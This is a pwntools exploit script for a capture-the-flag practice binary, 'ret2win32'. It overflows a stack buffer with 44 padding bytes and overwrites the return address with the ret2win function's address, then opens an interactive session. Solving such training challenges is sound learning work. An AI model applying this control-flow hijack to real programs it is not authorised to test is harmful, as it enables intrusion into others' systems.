#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./ret2win32')
context.terminal = ["/usr/bin/konsole", "-e", "sh", "-c"]

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

attack = b"A"*44 + p32(exe.symbols.ret2win)
print(attack)
io.sendline(attack)

io.interactive()

